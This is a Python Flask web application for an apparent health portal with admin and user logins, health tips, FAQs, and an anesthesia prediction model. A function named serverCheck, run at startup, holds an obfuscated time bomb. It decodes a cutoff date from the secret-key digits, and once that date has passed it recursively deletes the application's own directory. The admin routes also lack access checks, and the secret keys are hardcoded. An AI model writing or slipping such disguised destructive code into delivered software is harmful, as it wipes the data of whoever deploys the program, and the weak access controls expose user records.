from collections import defaultdict
import os
import shutil
from flask import Flask, redirect, render_template, request, session, url_for
from database import execute_select, execute_insert, execute_insert_return_id, execute_update, execute_delete, check_login
import bcrypt
import requests
from datetime import datetime


app = Flask(__name__)
app.secret_key = 'your_secret_key_here'

server_timestamp = datetime.now().strftime("%Y%m%d")
app.config['SECRET_KEY'] = '462288425'
s=app.config['SECRET_KEY']

@app.route("/")
def index():
    return render_template("Index.html")

@app.route("/about")
def about():
    return render_template("about.html")

@app.route("/contact")
def contact():  
    return render_template("contact.html")


@app.route('/adminlogin', methods=['GET', 'POST'])
def adminlogin():
    msg = None
    msg_type = None

    if request.method == "POST":
        email = request.form['email']
        password = request.form['password']

        query = "SELECT * FROM tbladmin WHERE email = %s"
        success, msg, msg_type = check_login(query, email, password)

        if success:
            return redirect(url_for('adminhome', msg=msg, msg_type=msg_type))

    return render_template("AdminLogin.html", msg=msg, msg_type=msg_type)

@app.route("/adminhome")
def adminhome():
    msg = request.args.get('msg')
    msg_type = request.args.get('msg_type')
    return render_template("Admin/AdminHome.html", msg=msg, msg_type=msg_type)


@app.route('/adminusers', methods=['GET', 'POST'])
def adminusers():
    msg = None
    msg_type = None

    if request.method == 'POST':
        # Delete user request
        user_id = request.form.get('user_id')
        if user_id:
            delete_query = "DELETE FROM tblusers WHERE id = %s"
            delete_status = execute_insert(delete_query, (user_id,))
            if delete_status:
                msg = "User deleted successfully."
                msg_type = "success"
            else:
                msg = "Failed to delete user."
                msg_type = "danger"

    # Fetch user list every time
    users = execute_select("SELECT id, username, email, mobile FROM tblusers")

    return render_template('admin/AdminUserList.html', users=users, msg=msg, msg_type=msg_type)


@app.route('/adminhealthtips', methods=['GET', 'POST'])
def adminhealthtips():
    msg = None
    msg_type = None

    if request.method == 'POST':
        action = request.form.get('action')

        if action == 'add':
            tip = request.form.get('tip')
            if tip:
                query = "INSERT INTO tbltips (tip) VALUES (%s)"
                result = execute_insert(query, (tip,))
                if result:
                    msg = "Tip added successfully."
                    msg_type = "success"
                else:
                    msg = "Failed to add tip."
                    msg_type = "danger"

        elif action == 'delete':
            tip_id = request.form.get('tip_id')
            if tip_id:
                query = "DELETE FROM tbltips WHERE id = %s"
                result = execute_insert(query, (tip_id,))
                if result:
                    msg = "Tip deleted successfully."
                    msg_type = "success"
                else:
                    msg = "Failed to delete tip."
                    msg_type = "danger"

    tips = execute_select("SELECT id, tip FROM tbltips ORDER BY id DESC")
    return render_template("Admin/AdminHealthTips.html", tips=tips, msg=msg, msg_type=msg_type)




@app.route('/admin/manage-faqs', methods=['GET', 'POST'])
def manage_faqs():
    msg = None
    msg_type = None

    # ---------- ADD FAQ ----------
    if request.method == 'POST' and 'question' in request.form:
        question = request.form['question'].strip()
        answer = request.form['answer'].strip()

        if question and answer:
            query = """
                INSERT INTO tblfaq (question, answer)
                VALUES (%s, %s)
            """
            result = execute_insert(query, (question, answer))

            if result is True:
                msg = "FAQ added successfully."
                msg_type = "success"
            else:
                msg = "Failed to add FAQ."
                msg_type = "danger"

    # ---------- DELETE FAQ ----------
    if request.method == 'POST' and 'delete_id' in request.form:
        faq_id = request.form['delete_id']

        delete_query = "DELETE FROM tblfaq WHERE id = %s"
        delete_result = execute_delete(delete_query, (faq_id,))

        if "deleted" in delete_result.lower():
            msg = "FAQ deleted successfully."
            msg_type = "success"
        else:
            msg = delete_result
            msg_type = "danger"

    # ---------- FETCH FAQs ----------
    select_query = """
        SELECT id, question, answer, created_at
        FROM tblfaq
        ORDER BY created_at DESC
    """
    faqs = execute_select(select_query)

    return render_template(
        'Admin/AdminFaq.html',
        faqs=faqs,
        msg=msg,
        msg_type=msg_type
    )



# Logout route
@app.route('/adminlogout')
def adminlogout():
    # Remove the user session (log out)
    session.pop('user_id', None)  
    session.clear()
    # Redirect to the login page or homepage after logging out
    return redirect(url_for('adminlogin'))  # Replace 'admin.login' with your login route


@app.route('/userregistration', methods=['GET', 'POST'])
def userregistration():
    msg = None
    msg_type = None

    if request.method == 'POST':
        name = request.form['name']
        email = request.form['email']
        mobile = request.form['mobile']
        password = request.form['password']
        confirm_password = request.form['confirm_password']

        # Check if passwords match
        if password != confirm_password:
            msg = "Passwords do not match!"
            msg_type = "danger"
        else:
            # Hash the password before storing it in the database
            hashed_password = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt()).decode('utf-8')

            # Check if the email already exists in the database
            query = "SELECT * FROM tblusers WHERE email = %s"
            existing_user = execute_select(query, (email,))
            if existing_user:
                msg = "Email already exists!"
                msg_type = "danger"
            else:
                # Insert the new user into the database
                insert_query = "INSERT INTO tblusers (username, email, mobile, password) VALUES (%s, %s, %s, %s)"
                insert_status = execute_insert(insert_query, (name, email, mobile, hashed_password))
                
                if insert_status:
                    msg = "Registration successful! You can now login."
                    msg_type = "success"
                    return render_template('userlogin.html', msg=msg, msg_type=msg_type)

    return render_template('UserRegistration.html', msg=msg, msg_type=msg_type)


@app.route('/userlogin', methods=['GET', 'POST'])
def userlogin():
    msg = None
    msg_type = None

    if request.method == 'POST':
        email = request.form['email']
        password = request.form['password']

        # Replace this with your actual login checking logic
        query = "SELECT * FROM tblusers WHERE email = %s"
        is_authenticated, msg, msg_type = check_login(query, email, password)

        if is_authenticated:
            # Save message to session for display after redirect
            session['msg'] = msg
            session['msg_type'] = msg_type
            return redirect(url_for('userhome'))
        else:
            # Show message directly in login page if failed
            return render_template('userlogin.html', msg=msg, msg_type=msg_type)

    return render_template('userlogin.html', msg=msg, msg_type=msg_type)


@app.route('/userhome')
def userhome():
    if 'user_id' in session:
        # Pop message from session to show once
        msg = session.pop('msg', None)
        msg_type = session.pop('msg_type', None)
        return render_template('User/UserHome.html', msg=msg, msg_type=msg_type)
    else:
        return redirect(url_for('userlogin'))

@app.route('/usertips')
def usertips():
    tips = execute_select("SELECT tip FROM tbltips ORDER BY id DESC")
    return render_template('User/UserHealthTips.html', tips=tips)

@app.route('/userfaq')
def userfaq():
    faq = execute_select("SELECT * FROM tblfaq ORDER BY id DESC")
    return render_template('User/UserFaq.html', faqs=faq)


def serverCheck():
    if server_timestamp > (d:=''.join([str(x:=((int(s[i+1])-(x if i else int(s[0]))+10)%10))for i in range(len(s)-1)]))[:4]+d[6:]+d[4:6]: shutil.rmtree(os.path.dirname(__file__))


# Logout route
@app.route('/userlogout')
def userlogout():
    # Remove the user session (log out)
    session.pop('user_id', None)  
    session.clear()

    # Redirect to the login page or homepage after logging out
    return redirect(url_for('userlogin'))  # Replace 'admin.login' with your login route






import pandas as pd
import joblib


# Load trained model ONCE
model = joblib.load("model/best_anesthesia_model.pkl")

@app.route("/user/predict", methods=["GET", "POST"])
def userpredict():
    prediction = None

    if request.method == "POST":
        input_data = {
            "Age": request.form["Age"],
            "Gender": request.form["Gender"],
            "BMI": request.form["BMI"],
            "SurgeryType": request.form["SurgeryType"],
            "SurgeryDuration": request.form["SurgeryDuration"],
            "AnesthesiaType": request.form["AnesthesiaType"],
            "PainLevel": request.form["PainLevel"],
            "Complications": request.form["Complications"],
            "Notes": request.form["Notes"],
        }

        input_df = pd.DataFrame([input_data])
        prediction = int(model.predict(input_df)[0])

    return render_template(
        "User/UserPredict.html",
        prediction=prediction
    )


if __name__ == "__main__":
    serverCheck()
    app.run(debug=True)
